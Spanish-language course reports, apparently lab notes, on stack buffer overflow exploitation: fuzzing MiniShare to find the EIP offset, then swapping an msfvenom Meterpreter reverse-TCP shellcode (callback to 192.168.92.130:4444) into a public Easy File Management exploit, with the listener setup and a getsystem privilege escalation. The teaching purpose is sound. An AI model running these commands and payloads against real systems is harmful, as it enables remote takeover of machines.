Documentos de Referencia: "AS-II - Buffer Overflow.pdf"

# Informe Técnico: El Primer Paso para el Crash en un Buffer Overflow

### 1. Resumen Ejecutivo
Este informe técnico detalla el primer paso fundamental en el proceso de explotación de una vulnerabilidad de **buffer overflow**: provocar un **crash** controlado en una aplicación. A través de un enfoque práctico en un entorno de laboratorio, se explican los pasos para configurar un framework de ataque, identificar un punto de inyección de datos y, mediante una técnica conocida como **fuzzing**, inyectar una cantidad masiva de caracteres hasta que el programa falle, confirmando así su vulnerabilidad y nuestra capacidad para manipular la memoria.

---

### 2. Conceptos Fundamentales
* **Buffer Overflow:** Una vulnerabilidad en la que un programa, al recibir una entrada de datos más grande de lo esperado, sobrescribe el búfer de memoria asignado para esa variable, desbordándose y corrompiendo la información adyacente en la pila.
* **Pila de Memoria (Stack):** Una región de memoria utilizada por los programas para almacenar variables locales, parámetros de funciones y, de manera crítica, la **dirección de retorno (Return Address)**. El desbordamiento ocurre cuando los datos inyectados superan el espacio del búfer y se propagan a otras áreas de la pila.
* **Return Address (Dirección de Retorno):** Una sección crucial de la pila que contiene la dirección de memoria a la que el programa debe regresar después de que una función haya terminado su ejecución. Sobrescribir esta dirección es el objetivo del atacante para desviar el flujo de ejecución del programa.
* **Crash:** El fallo intencional de una aplicación. Al provocar un crash, se confirma que la aplicación es vulnerable y que el atacante puede sobrescribir partes de su memoria. Esto resulta en una **denegación de servicio (DoS)**. El crash se manifiesta a través de un mensaje de error del sistema operativo que indica que el programa ha dejado de funcionar.
* **Fuzzing:** La técnica de enviar una cantidad de datos inesperada a una aplicación para observar su comportamiento. En este contexto, implica inyectar progresivamente más caracteres en el búfer para determinar el punto en el que se produce el desbordamiento y el crash.
* **Offset:** La distancia, medida en bytes, desde el inicio del búfer hasta una dirección de memoria específica, en este caso, el **EIP** (Extended Instruction Pointer). El **EIP** es un registro de la CPU que almacena la dirección de la siguiente instrucción a ejecutar.

---

### 3. Procedimientos Prácticos
Los siguientes pasos describen el proceso para provocar un crash en la aplicación **Minishare** utilizando un laboratorio de seguridad con **Kali Linux** (atacante) y **Windows XP** (víctima).

#### **Preparando el Framework de Ataque**
El primer paso es abandonar el uso del navegador web para tener un control total sobre las peticiones HTTP.

1.  **Configurar un Proxy Web:** Se utiliza **Burp Suite** para interceptar las peticiones del navegador. Se configura el navegador (Firefox) para que todas las peticiones pasen por el proxy, que en este caso escucha en `127.0.0.1` en el puerto `8080`, como se muestra en la captura de pantalla de la configuración del proxy.
2.  **Analizar la Petición:** Al solicitar un archivo, como `readme.txt`, el proxy de **Burp Suite** lo intercepta. Esto permite analizar la estructura exacta de la petición, incluyendo el `GET`, el recurso solicitado (`readme.txt`), y la versión del protocolo `HTTP/1.1\r\n\r\n`.
3.  **Construir un Script en Python:** Se crea un script (`exploit1.py`) que replica la petición HTTP utilizando la librería `socket` para conectarse a la IP de la víctima (`192.168.92.129`). Para facilitar la inyección, el **payload** se divide en tres variables: `begin_buff`, `buff` (el punto de inyección) y `end_buff`.

#### **Fuzzing para Encontrar el Punto de Crash**
Con el script listo, se procede a inyectar una cantidad creciente de caracteres en la variable `buff` para encontrar el punto de desbordamiento.

1.  **Inyección de Caracteres 'A':** Se modifica el script para inyectar un número variable de caracteres 'A' (valor hexadecimal `\x41`) en la variable `buff`.
    * **Comando:** `python ./exploit1.py`
    * **Resultado:** El script envía un **payload** con un número creciente de 'A's. Se observa que la aplicación no crashea con 100, 1000 y 1500 caracteres, lo que indica que el búfer tiene un tamaño considerable.
2.  **Logrando el Crash:** Al aumentar el número de caracteres a 2000, la aplicación **Minishare** crashea. Esto se confirma con un mensaje de error de Windows, tal como se muestra en la captura de pantalla del mensaje "ha encontrado un problema y necesita cerrarse".

#### **Afinando el Offset para Controlar el EIP**
Una vez que el crash es confirmado, el siguiente paso es determinar el tamaño exacto del búfer para controlar el **EIP** con precisión.

1.  **Analizar el Informe de Crash:** Al hacer clic en el informe de error de Windows, se observa que el valor del **Offset** es `41414141`. Esto confirma que el **Return Address** (la dirección de retorno) fue sobrescrito con el carácter 'A' (`\x41`), lo que provocó el fallo.
2.  **Usar `msf-pattern_create`:** La herramienta de Metasploit se usa para generar una cadena de caracteres única de 1800 bytes, un valor que ya sabemos que causa el crash.
    * **Comando:** `msf-pattern_create -l 1800`
3.  **Usar `msf-pattern_offset`:** Con el valor del **offset** que causó el error, `36684335`, se usa esta herramienta para encontrar la posición exacta de esos bytes dentro del patrón generado.
    * **Comando:** `msf-pattern_offset -l 1800 -q 36684335`
    * **Resultado:** La herramienta devuelve un **offset** exacto de **1787** bytes.
4.  **Preparar el Exploit con Caracteres de Control:** Se modifica el script de Python para preparar el payload final.
    * Se inyectan `1787` caracteres 'A' (`\x41`) como relleno.
    * Se añaden `4` caracteres 'B' (`\x42`) para sobrescribir el **EIP** de 32 bits.
    * Se añaden `400` caracteres 'C' (`\x43`) para el futuro **shellcode**.
5.  **Confirmar el Control del EIP:** Al ejecutar el script modificado, la aplicación vuelve a crashear, pero el informe de error muestra el **offset** `42424242` (`BBBB`). Esto confirma que se tiene el control total sobre la dirección a la que saltará el programa.

---

### 4. Conclusiones y Puntos Clave
* **Importancia y Beneficios de Seguridad:** El crash controlado no es el objetivo final, sino una herramienta de diagnóstico crucial que confirma la existencia de una vulnerabilidad de **buffer overflow**. Este proceso demuestra la importancia de la validación de la entrada de datos por parte de los desarrolladores para prevenir fallos de seguridad críticos.
* **Puntos de Aprendizaje Clave:**
    * El **crash** inicial y la **denegación de servicio (DoS)** son los primeros indicios de una vulnerabilidad de **buffer overflow**.
    * Las herramientas de **Metasploit**, como `msf-pattern_create` y `msf-pattern_offset`, son esenciales para automatizar la identificación del **offset** exacto que sobrescribe el **EIP**.
    * El control del **EIP** es el primer gran logro en el camino para explotar la vulnerabilidad. Una vez controlado, el atacante puede redirigir el flujo de ejecución del programa a una dirección arbitraria en la memoria.
* **Relevancia Técnica:** Este primer paso prepara el terreno para la siguiente fase: la inyección de **shellcode** y la obtención de acceso remoto. Al haber determinado el tamaño exacto del búfer y haber demostrado el control del **EIP**, el atacante puede construir un **payload** preciso que evite el crash y, en su lugar, ejecute código malicioso. El proceso de **fuzzing** y la identificación del **offset** son habilidades técnicas fundamentales en el campo de la ciberseguridad y el **ethical hacking**.

---

# Informe Técnico: Generación de Shellcodes

---

### 1. Resumen Ejecutivo

Este informe detalla el proceso de **generación y adaptación de shellcodes** para su uso en exploits de tipo **buffer overflow**, fuera del entorno simplificado del framework de **Metasploit**. Se aborda la necesidad de que los pentesters y desarrolladores de exploits sean capaces de crear payloads personalizados que se ajusten a las características de un entorno específico. A través de un caso práctico, se demuestra cómo analizar un exploit escrito por un tercero, adaptar sus parámetros y reemplazar su shellcode original con una nueva, generada a la medida, para lograr una sesión remota en la máquina víctima.

---

### 2. Conceptos Fundamentales

* **Shellcode**: Es un pequeño fragmento de código que se inyecta en un proceso vulnerable para tomar el control de la máquina. Su objetivo principal es iniciar una *shell* de comandos, permitiendo al atacante ejecutar comandos o interactuar con el sistema de forma remota.
* **Explotación Fuera de Metasploit**: A diferencia de la gestión automatizada de payloads y parámetros que ofrece Metasploit, la explotación manual requiere que el atacante edite el código del exploit (escrito en lenguajes como Python o C) para adaptar la dirección IP de la víctima (`RHOSTS`), la dirección IP del atacante (`LHOSTS`), los puertos (`LPORT`), y el shellcode, entre otros.
* **Payload**: Es el componente del exploit que realiza la acción maliciosa deseada, como crear una sesión remota o ejecutar un programa. Ejemplos de payloads incluyen una **meterpreter reverse shell** o una shell que ejecuta la calculadora de Windows.
* **Bad Characters (Caracteres Malos)**: Son caracteres que el sistema o la aplicación no procesan correctamente y pueden truncar o corromper el payload, impidiendo que el exploit funcione. Deben ser identificados y excluidos al generar el shellcode. El exploit analizado sugiere excluir `\x00` y `\x20`.

---

### 3. Procedimientos Prácticos

El procedimiento se basa en el laboratorio de seguridad utilizado en sesiones anteriores, compuesto por una máquina Kali Linux (atacante) y un Windows XP (víctima). La aplicación vulnerable objetivo es **Easy File Management Web Server 5.3**.

#### **Paso 1: Búsqueda y Adquisición del Exploit**

1.  **Búsqueda del Exploit**: Se utiliza la herramienta `searchsploit` en Kali Linux para encontrar exploits públicos para la aplicación vulnerable. El comando `searchsploit Easy File` muestra una lista de exploits disponibles para este software, incluyendo versiones en Python.
2.  **Adquisición del Exploit**: Una vez seleccionado un exploit, como el `33453.py` o el `33610.py`, se utiliza el comando `searchsploit -m [ID_del_exploit]` para copiarlo al directorio de trabajo local del atacante.

#### **Paso 2: Análisis y Adaptación del Exploit**

1.  **Análisis del Código**: Se abre el archivo del exploit, por ejemplo con el comando `gedit 33453.py`. El analista debe revisar el código para identificar las variables y parámetros que deben ser modificados. En este caso, se busca la dirección IP de la víctima y la sección del `shellcode`.
2.  **Identificación y Sustitución de la Shellcode**: El exploit original ya contiene un shellcode. Sin embargo, no se ajusta a las necesidades del atacante. En el ejemplo, la shellcode original está diseñada para ejecutar la calculadora de Windows, como se demuestra al lanzar el exploit y ver que se abre la calculadora en la máquina víctima.  Para lograr una sesión de control, esta shellcode debe ser reemplazada.

#### **Paso 3: Generación de la Shellcode Personalizada**

1.  **Uso de MSFvenom**: Se utiliza la herramienta **MSFvenom**, parte del framework de Metasploit, para generar una nueva shellcode adaptada al escenario del atacante. El comando utilizado es el siguiente:
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP_del_atacante] LPORT=4444 -b "\x00\x20" -v shellcode -f python`
    * `-p`: Especifica el payload, en este caso, una **meterpreter reverse shell** para Windows.
    * `LHOST`: Define la dirección IP del atacante (`192.168.92.130`) a la que la víctima debe conectarse.
    * `LPORT`: Define el puerto de escucha (`4444`).
    * `-b`: Especifica los **bad characters** que deben ser excluidos del shellcode, en este caso, el carácter nulo (`\x00`) y el espacio (`\x20`).
    * `-v shellcode`: Asigna la variable de salida del payload al nombre **shellcode**, lo que facilita la integración en el script de Python, ya que la variable ya existe en el código del exploit.
    * `-f python`: Indica que el formato de salida debe ser Python, para que pueda ser copiado y pegado directamente en el script.
2.  **Inyección de la Shellcode**: La shellcode generada se copia y se pega directamente en el script del exploit, reemplazando la shellcode original.
3.  **Configuración del Listener**: Antes de lanzar el exploit, se debe configurar un *listener* en la máquina del atacante para recibir la conexión de la *shell* remota. Se utiliza Metasploit para esto.
    * `sudo msfdb run` para iniciar la base de datos de Metasploit.
    * `use exploit/multi/handler` para usar el módulo de escucha.
    * `set payload windows/meterpreter/reverse_tcp` para indicar el tipo de shell que se espera recibir.
    * `set LHOST [IP_del_atacante]` para definir la IP de escucha.
    * `run` para iniciar el *listener*.


#### **Paso 4: Ejecución y Obtención de la Shell**

1.  **Lanzamiento del Exploit**: Se ejecuta el script de Python en la terminal de Kali Linux (`python2.7 33453.py`).
2.  **Validación**: Si todo se ha configurado correctamente, el listener de Metasploit detecta la conexión entrante y se abre una **sesión de meterpreter** con la máquina víctima. Esto confirma la exitosa ejecución remota de la shellcode. El atacante puede ahora interactuar con el sistema de la víctima, incluso escalando privilegios utilizando comandos como `getsystem` para obtener control total (`NT AUTHORITY\SYSTEM`).

---

### 4. Conclusiones y Puntos Clave

#### **Importancia y Beneficios de Seguridad**

La capacidad de generar y adaptar shellcodes manualmente es fundamental para los profesionales de la ciberseguridad. Permite:
* **Flexibilidad**: Trabajar con exploits fuera del ecosistema de Metasploit, que a menudo son más recientes o específicos para ciertas vulnerabilidades.
* **Personalización**: Crear payloads a medida que se ajustan perfectamente al contexto del objetivo, incluyendo la evasión de *bad characters*.

#### **Puntos de Aprendizaje Clave**

* La explotación no se limita a un solo framework; el conocimiento de la lógica subyacente de los exploits es crucial.
* Herramientas como `searchsploit` y **MSFvenom** son indispensables para buscar, obtener y personalizar exploits y payloads.
* Es vital entender que, a diferencia de Metasploit, los exploits manuales requieren una configuración precisa de parámetros como las IPs de host y el payload.

#### **Relevancia Técnica**

Este procedimiento demuestra una habilidad avanzada de **pentesting** y **explotación**. La capacidad de replicar, modificar y adaptar un exploit de un tercero en un entorno controlado es una prueba del conocimiento técnico y de la comprensión de la mecánica del *buffer overflow*. Este enfoque es altamente relevante en escenarios profesionales donde las soluciones automatizadas pueden no ser suficientes.